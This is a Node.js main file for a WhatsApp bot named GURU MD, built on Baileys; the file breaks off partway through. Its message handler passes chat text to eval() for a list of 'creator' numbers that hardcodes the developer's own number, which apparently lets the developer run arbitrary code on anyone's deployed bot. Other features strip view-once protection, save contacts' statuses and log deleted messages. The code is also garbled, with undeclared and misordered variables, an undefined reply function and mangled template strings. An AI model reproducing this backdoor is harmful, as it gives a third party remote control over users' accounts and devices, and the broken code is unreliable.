// === Memory Optimization - Safe for all hosts (Heroku, Railway, Render, etc.) ===
process.env.NODE_OPTIONS = '--max-old-space-size=384';
process.env.BAILEYS_MEMORY_OPTIMIZED = 'true';

const baileys = require('@whiskeysockets/baileys');
const makeWASocket = baileys.default;
const {
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  downloadMediaMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = baileys;

// === Stylish Logs Setup ===
const chalk = require('chalk');

// Normal colorful log (for quick messages)
function logInfo(message, color = 'green') {
  console.log(chalk[color].bold(`[GURU] ${message}`));
}

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const readline = require('readline');

const prefix = config.PREFIX;

const ownerNumber = ['254778074353@s.whatsapp.net'];  

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
};

setInterval(clearTempDir, 5 * 60 * 1000);

const isHeroku = !!process.env.DYNO;

// Readline only for non-Heroku (panels/local)
const rl = isHeroku ? null : readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// =================== DIRECT BASE64 SESSION ===================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (isHeroku) {
        if (!process.env.SESSION_ID) {
            console.log(chalk.red('❌ ERROR: SESSION_ID is not set in Heroku Config Vars!'));
            console.log(chalk.yellow('Add your base64 session string to SESSION_ID and redeploy.'));
            process.exit(1);
        }

        console.log(chalk.cyan('Heroku mode: Using SESSION_ID from env vars...'));

        try {
            let base64Session = process.env.SESSION_ID.trim();
            if (base64Session.startsWith('GURU~')) {
                base64Session = base64Session.replace('GURU~', '').trim();
            }

            if (!base64Session || base64Session.length < 100) {
                console.log(chalk.red('❌ ERROR: SESSION_ID appears invalid or too short'));
                process.exit(1);
            }

            const decoded = Buffer.from(base64Session, 'base64').toString('utf-8');
            const creds = JSON.parse(decoded);

            fs.mkdirSync(__dirname + '/sessions', { recursive: true });
            fs.writeFileSync(
                __dirname + '/sessions/creds.json',
                JSON.stringify(creds, null, 2)
            );

            console.log(chalk.green('✅ SESSION_ID successfully saved to creds.json'));
        } catch (e) {
            console.log(chalk.red('❌ Failed to process SESSION_ID:', e.message));
            process.exit(1);
        }
    } else {
        // Non-Heroku: prompt for phone number + pairing code
        console.log(chalk.cyan('No session found. Starting pairing flow...'));

        const phoneNumber = await new Promise(resolve => {
            rl.question(chalk.cyan('Enter your phone number (with country code, e.g. 254712345678): '), num => {
                resolve(num.trim());
            });
        });

        if (!/^\d{10,14}$/.test(phoneNumber)) {
            console.log(chalk.red('Invalid number. Must be digits only with country code.'));
            process.exit(1);
        }

        console.log(chalk.yellow(`Generating pairing code for +${phoneNumber}...`));

        // Pairing code will be handled in makeWASocket options below
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Global toggles
global.AUTO_VIEW_STATUS = false;
global.AUTO_REACT_STATUS = false;
global.AUTO_REPLY = false; // Added for autoreply toggle

// Configurable tagging helper
const taggedReply = (conn, from, teks, quoted = null) => {
    if (!config.ENABLE_TAGGING) {
        return conn.sendMessage(from, { text: teks }, { quoted: quoted || undefined });
    }

    let tag = config.BOT_TAG_TEXT || '> _Powered by GURU MD 💢_';
    let finalText = config.TAG_POSITION === 'start' ? `\( {tag}\n\n \){teks}` : `\( {teks}\n\n \){tag}`;

    conn.sendMessage(from, { text: finalText }, { quoted: quoted || undefined });
};

//=============================================

async function connectToWA() {
    console.log(chalk.cyan("Connecting to WhatsApp ⏳️..."));
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
    var { version } = await fetchLatestBaileysVersion();

    const isHeroku = !!process.env.DYNO;

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: !isHeroku,
        browser: Browsers.macOS("Firefox"),
        auth: state,
        version,
        pairingCode: !isHeroku && !fs.existsSync(__dirname + '/sessions/creds.json')
    });

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr && !isHeroku) {
            console.log(chalk.yellow('Scan this QR to link:'));
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA();
            }
        } else if (connection === 'open') {
            console.log(chalk.green.bold('BOT STARTUP SUCCESS'));
            console.log(chalk.green('Status: Connected ✅'));
            console.log(chalk.cyan('Time: ' + new Date().toLocaleString()));
            console.log(chalk.cyan('Baileys Version: ' + version.join('.')));
            console.log(chalk.cyan('Prefix: ' + prefix));
            console.log(chalk.cyan('Owner: ' + ownerNumber[0]));

            // Auto join group & follow channel
            if (config.GROUP_INVITE_CODE) {
                conn.groupAcceptInvite(config.GROUP_INVITE_CODE)
                    .then(() => console.log(chalk.green('Auto-joined group')))
                    .catch(e => console.log(chalk.yellow('Group join failed:', e.message)));
            }

            if (config.CHANNEL_JID) {
                conn.newsletterFollow(config.CHANNEL_JID)
                    .then(() => console.log(chalk.green('Auto-followed channel')))
                    .catch(e => console.log(chalk.yellow('Channel follow failed:', e.message)));
            }

            console.log(chalk.cyan('🧬 Installing Plugins'));
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log(chalk.green('Plugins installed successful ✅'));
            console.log(chalk.green('Bot connected to whatsapp ✅'));

            let up = `*✨ ʜᴇʟʟᴏᴡ GURU MD ʟᴇɢᴇɴᴅꜱ! ✨*

╭─〔 *GURU MD 💢* 〕  
├─▸ *ꜱɪᴍᴘʟɪᴄɪᴛʏ. ꜱᴘᴇᴇᴅ. ᴘᴏᴡᴇʀᴇᴅ . ʙʏ GuruTech |*  
╰─➤ *ʜᴇʀᴇ ᴀʀᴇ ɴᴇᴡ ᴡʜᴀᴛꜱᴀᴘᴘ ꜱɪᴅᴇᴋɪᴄᴋ!*

♦️ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ GURU MD♦️!

╭──〔 🔗 Qᴜɪᴄᴋ ʟɪɴᴋ 〕  
├─ ⭐ *ɢɪᴠᴇ ᴜꜱ ꜱᴛᴀʀ ᴀɴᴅ ꜏ᴏʀᴋ:*  
│   ꜱᴛᴀʀ ᴜꜱ [ʜᴇʀᴇ](https://github.com/itsguruu/GURU)!  
╰─🛠️ *Prefix:* \`${prefix}\`

> _© ᴄʀᴇᴀᴛᴇᴅ ʙʏ GuruTech _`;
            conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/ntfw9h.jpg` }, caption: up });
        }
    });

    conn.ev.on('creds.update', saveCreds);

    //==============================

    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log(chalk.red.bold('DELETE DETECTED'));
                console.log(chalk.red('Update: ' + JSON.stringify(update, null, 2)));
                await AntiDelete(conn, updates);
            }
        }
    });

    // === AUTO VIEW (FORCED VISIBLE) + AUTO SAVE + AUTO REACT ===
    conn.ev.on('messages.upsert', async (mekUpdate) => {
        const msg = mekUpdate.messages[0];
        if (!msg?.message) return;

        if (msg.key.remoteJid === 'status@broadcast') {
            // Auto View Status - FORCED VISIBLE with random delay
            if (global.AUTO_VIEW_STATUS) {
                try {
                    const delay = 3000 + Math.floor(Math.random() * 9000);
                    console.log(chalk.yellow.bold('AUTO-VIEW STATUS'));
                    console.log(chalk.yellow('Action: Waiting before marking seen'));
                    console.log(chalk.yellow('Delay: ' + (delay / 1000).toFixed(1) + ' seconds'));
                    console.log(chalk.yellow('From: ' + (msg.key.participant || msg.pushName || 'unknown')));

                    await sleep(delay);

                    await conn.readMessages([msg.key]);
                    console.log(chalk.green.bold('AUTO-VIEW SUCCESS'));
                    console.log(chalk.green('Status: Marked as seen'));
                    console.log(chalk.green('From: ' + (msg.key.participant || msg.pushName || 'unknown')));
                    console.log(chalk.green('Time: ' + new Date().toLocaleTimeString()));
                } catch (viewErr) {
                    console.log(chalk.red.bold('AUTO-VIEW ERROR'));
                    console.log(chalk.red('Error: ' + (viewErr.message || 'Unknown error')));
                }
            }

            // Auto React to Status - 50 emojis mixture
            if (global.AUTO_REACT_STATUS) {
                const emojis = [
                    '🔥', '❤️', '💯', '😂', '😍', '👏', '🙌', '🎉', '✨', '💪',
                    '🥰', '😎', '🤩', '🌟', '💥', '👀', '😭', '🤣', '🥳', '💜',
                    '😘', '🤗', '😢', '😤', '🤔', '😴', '😷', '🤢', '🥵', '🥶',
                    '🤯', '🫡', '🫶', '💀', '😈', '👻', '🫂', '🐱', '🐶', '🌹',
                    '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯', '🙏', '👑', '😊'
                ];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

                try {
                    const reactionKey = {
                        remoteJid: msg.key.remoteJid,
                        fromMe: false,
                        id: msg.key.id || generateMessageID(),
                        participant: msg.key.participant || msg.key.remoteJid
                    };

                    await conn.relayMessage('status@broadcast', {
                        reactionMessage: {
                            key: reactionKey,
                            text: randomEmoji,
                            senderTimestampMs: Date.now()
                        }
                    }, { messageId: generateMessageID() });

                    console.log(chalk.magenta.bold('AUTO-REACT SUCCESS'));
                    console.log(chalk.magenta('Emoji: ' + randomEmoji));
                    console.log(chalk.magenta('To: ' + (msg.key.participant || msg.pushName || 'unknown')));
                } catch (reactErr) {
                    console.log(chalk.red.bold('AUTO-REACT ERROR'));
                    console.log(chalk.red('Error: ' + reactErr.message));
                }
            }

            // Auto Save Status (download media)
            if (global.AUTO_SAVE_STATUS) {
                try {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: console });
                    const isImage = !!msg.message.imageMessage;
                    const ext = isImage ? '.jpg' : '.mp4';
                    const fileName = `status_\( {Date.now()} \){ext}`;
                    const savePath = `./statuses/${fileName}`;

                    if (!fs.existsSync('./statuses')) {
                        fs.mkdirSync('./statuses', { recursive: true });
                    }

                    fs.writeFileSync(savePath, buffer);

                    console.log(chalk.green.bold('AUTO-SAVE SUCCESS'));
                    console.log(chalk.green('File: ' + fileName));
                    console.log(chalk.green('Path: ' + savePath));
                    console.log(chalk.green('Type: ' + (isImage ? 'Image' : 'Video')));
                } catch (err) {
                    console.log(chalk.red.bold('AUTO-SAVE ERROR'));
                    console.log(chalk.red('Error: ' + err.message));
                }
            }
        }

        // === CONTINUOUS SMART AUTO-REPLY (Guru style, works in groups & private) ===
        // Re-use variables that will be declared later in the scope (body, from, isCmd, senderNumber, etc.)
        if (global.AUTO_REPLY && !isCmd && !mek.key.fromMe) {
            const msgText = (body || '').toLowerCase().trim();
            let replyText = `Guru got your message! 😎`;

            // Expanded keyword matches with Guru personality
            if (msgText.includes("hi") || msgText.includes("hello") || msgText.includes("hey") || msgText.includes("sup")) {
                const greetings = [
                    "Heyy! Guru's here for you 🔥",
                    "Yo legend! What's the vibe today? 😏",
                    "Hello boss! Guru reporting in 👑",
                    "Heyy! Guru missed you 😎",
                    "What's good my G? Guru in the building! 🚀"
                ];
                replyText = greetings[Math.floor(Math.random() * greetings.length)];
            }
            else if (msgText.includes("how are you") || msgText.includes("how r u") || msgText.includes("hru") || msgText.includes("wassup")) {
                const responses = [
                    "Guru's chilling like a king 😏 You good?",
                    "Guru's on fire! 🔥 How about you legend?",
                    "Guru's great bro! What's popping?",
                    "Guru's 100% baby! 😎 What's up with you?",
                    "Guru's always lit! You holding up? 💯"
                ];
                replyText = responses[Math.floor(Math.random() * responses.length)];
            }
            else if (msgText.includes("morning") || msgText.includes("good morning")) {
                const morningReplies = [
                    "Morning legend! Guru wishes you a powerful day ☀️💪",
                    "Rise and grind king! Guru's up early with you 🌅",
                    "Good morning boss! Let's make today count 🔥",
                    "Morning my G! Guru's ready – you? 😎"
                ];
                replyText = morningReplies[Math.floor(Math.random() * morningReplies.length)];
            }
            else if (msgText.includes("night") || msgText.includes("good night") || msgText.includes("gn")) {
                const nightReplies = [
                    "Night king! Guru says sleep tight & dream big 🌙✨",
                    "Good night legend! Guru's watching over you 😴",
                    "Night boss! Recharge that energy – see you tomorrow 💪",
                    "Sweet dreams my G! Guru out ✌️🌙"
                ];
                replyText = nightReplies[Math.floor(Math.random() * nightReplies.length)];
            }
            else if (msgText.includes("love") || msgText.includes("miss") || msgText.includes("i love you") || msgText.includes("ily")) {
                const loveReplies = [
                    "Aww Guru loves you too ❤️",
                    "Guru's heart just melted 😍 Right back at ya!",
                    "Love you more boss! 😘",
                    "Guru feels the same vibe ❤️🔥",
                    "You got Guru blushing over here 🥰"
                ];
                replyText = loveReplies[Math.floor(Math.random() * loveReplies.length)];
            }
            else if (msgText.includes("haha") || msgText.includes("lol") || msgText.includes("😂") || msgText.includes("lmao") || msgText.includes("lmfao")) {
                replyText = "😂😂 Guru's dying over here! What's so funny king?";
            }
            else if (msgText.includes("?")) {
                replyText = "Guru's listening... ask away boss 👂🔥";
            }
            else if (msgText.includes("thank") || msgText.includes("thanks") || msgText.includes("ty") || msgText.includes("appreciate")) {
                const thanksReplies = [
                    "You're welcome legend! Guru always got you 🙌",
                    "No problem boss! Guru's pleasure 😎",
                    "Anytime my G! 💯",
                    "Guru appreciates you too ❤️"
                ];
                replyText = thanksReplies[Math.floor(Math.random() * thanksReplies.length)];
            }
            else if (msgText.includes("sorry") || msgText.includes("sry") || msgText.includes("apologies") || msgText.includes("my bad")) {
                replyText = "No stress bro, Guru forgives everything 😎 All good!";
            }
            else if (msgText.includes("bro") || msgText.includes("brother") || msgText.includes("fam") || msgText.includes("dude")) {
                replyText = "What's good fam? Guru's right here with you 💯";
            }
            else if (msgText.includes("boss") || msgText.includes("king") || msgText.includes("legend") || msgText.includes("goat")) {
                replyText = "Guru sees you flexing 😏 King shit!";
            }
            else if (msgText.includes("food") || msgText.includes("eat") || msgText.includes("hungry") || msgText.includes("lunch") || msgText.includes("dinner")) {
                replyText = "Guru's hungry too bro! What's on the menu? 🍔🔥";
            }
            else if (msgText.includes("sleep") || msgText.includes("tired") || msgText.includes("exhausted")) {
                replyText = "Guru says rest up king! Recharge mode activated 😴";
            }
            else if (msgText.includes("joke") || msgText.includes("funny") || msgText.includes("make me laugh")) {
                const jokes = [
                    "Why don't programmers prefer dark mode? Because light attracts bugs 😂",
                    "Guru's joke: Your phone and I have something in common – we're both addicted to you 😏",
                    "Parallel lines have so much in common… it's a shame they'll never meet 😂",
                    "Guru: Why did the scarecrow win an award? Because he was outstanding in his field! 🌾"
                ];
                replyText = jokes[Math.floor(Math.random() * jokes.length)];
            }
            else {
                // Random Guru-style defaults
                const defaults = [
                    "Guru caught that! 😎 What's next boss?",
                    "Guru's vibing with you 🔥 Talk to me",
                    "Guru's here legend! Spill the tea 👀",
                    "Guru sees you king 👑 What's the word?",
                    "Guru's locked in! Hit me 😏",
                    "Guru's feeling that energy 🔥 Keep going!",
                    "Guru's tuned in boss! What's the play?",
                    "Guru's got eyes on you legend 😎"
                ];
                replyText = defaults[Math.floor(Math.random() * defaults.length)];
            }

            // Send reply (in group or private)
            await conn.sendMessage(from, { text: replyText });
            console.log(chalk.magenta(`[GURU AUTO-REPLY] → ${senderNumber}: ${replyText}`));
        }

        //============= Main messages handler ===============
        mek = mekUpdate.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);
            console.log(chalk.blue.bold('MESSAGE READ'));
            console.log(chalk.blue('From: ' + mek.key.remoteJid));
            console.log(chalk.blue('Time: ' + new Date().toLocaleTimeString()));
        }

        if(mek.message.viewOnceMessageV2)
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message

        await Promise.all([
            saveMessage(mek),
        ]);

        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        const isCmd = body.startsWith(prefix)
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isReact = m.message.reactionMessage ? true : false

        const udp = botNumber.split('@')[0];
        const jawad = ('254778074353');
        let isCreator = [udp, jawad, config.DEV]
            .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
            .includes(mek.sender);

        if (isCreator && mek.text?.startsWith('%')) {
            let code = budy.slice(2);
            if (!code) {
                taggedReplyFn(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = eval(code);
                if (typeof resultTest === 'object')
                    taggedReplyFn(util.format(resultTest));
                else taggedReplyFn(util.format(resultTest));
            } catch (err) {
                taggedReplyFn(util.format(err));
            }
            return;
        }

        if (isCreator && mek.text?.startsWith('$')) {
            let code = budy.slice(2);
            if (!code) {
                taggedReplyFn(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
                let h = util.format(resultTest);
                if (h === undefined) return console.log(h);
                else taggedReplyFn(h);
            } catch (err) {
                if (err === undefined)
                    return console.log('error');
                else taggedReplyFn(util.format(err));
            }
            return;
        }

        //================ownerreact==============
        if(senderNumber.includes("254778074353")){
            if(isReact) return
            m.react("🤍")
        }

        //==========public react============//
        if (!isReact && senderNumber !== botNumber) {
            if (config.AUTO_REACT === 'true') {
                const reactions = [
                    '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                    '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                    '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                    '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                    '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                ];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        // Owner React (self messages)
        if (!isReact && senderNumber === botNumber) {
            if (config.AUTO_REACT === 'true') {
                const reactions = [
                    '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                    '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                    '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                    '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                    '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                ];
                const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomOwnerReaction);
            }
        }

        // custum react settings                        
        if (!isReact && senderNumber !== botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        if (!isReact && senderNumber === botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        } 

        // ========== FIXED MODE CONTROL - You always get commands ==========
        let shouldProcess = false;

        if (config.MODE === "public" || !config.MODE) {
            shouldProcess = true;
        } else if (config.MODE === "private") {
            if (isOwner || isMe || senderNumber === "254778074353") {
                shouldProcess = true;
            }
        }

        if (!shouldProcess && isCmd) {
            console.log(chalk.yellow(`[BLOCKED] Command "${command}" from ${senderNumber} - MODE: ${config.MODE}`));
        }

        if (shouldProcess) {
            // take commands 
            const events = require('./command')
            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

                    try {
                        await cmd.function(conn, mek, m, {
                            conn,
                            mek,
                            m,
                            from,
                            quoted,
                            body,
                            isCmd,
                            command,
                            args,
                            q,
                            text,
                            isGroup,
                            sender,
                            senderNumber,
                            botNumber2,
                            botNumber,
                            pushname,
                            isMe,
                            isOwner,
                            isCreator,
                            groupMetadata,
                            groupName,
                            participants,
                            groupAdmins,
                            isBotAdmins,
                            isAdmins,
                            reply: (teks) => taggedReply(conn, from, teks, mek)
                        });
                    } catch (e) {
                        console.log(chalk.red.bold('PLUGIN ERROR'));
                        console.log(chalk.red('Error: ' + (e.stack || e.message || e)));
                        console.log(chalk.red('Command: ' + (cmdName || 'unknown')));
                        await taggedReply(conn, from, 'Plugin error: ' + (e.message || 'Unknown'), mek);
                    }
                }
            }
            events.commands.map(async(command) => {
                if (body && command.on === "body") {
                    await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)})
                } else if (mek.q && command.on === "text") {
                    await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)})
                } else if (
                    (command.on === "image" || command.on === "photo") &&
                    mek.type === "imageMessage"
                ) {
                    await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)})
                } else if (
                    command.on === "sticker" &&
                    mek.type === "stickerMessage"
                ) {
                    await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)})
                }
            });
        }
    });

    //===================================================   
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
                (decode.user &&
                    decode.server &&
                    decode.user + '@' + decode.server) ||
                jid
            );
        } else return jid;
    };

    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = {
                ...message.message.viewOnceMessage.message
            }
        }

        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
    }

    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
    }

    //=================================================
    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }

    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        let finalCaption = caption;
        if (config.ENABLE_TAGGING) {
            finalCaption = config.TAG_POSITION === 'start' 
                ? `\( {config.BOT_TAG_TEXT}\n\n \){caption}`
                : `\( {caption}\n\n \){config.BOT_TAG_TEXT}`;
        }
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: finalCaption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: finalCaption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: finalCaption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: finalCaption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: finalCaption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
    }

    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id

        return proto.WebMessageInfo.fromObject(copy)
    }

    //=====================================================
    conn.getFile = async(PATH, save) => {
        let res
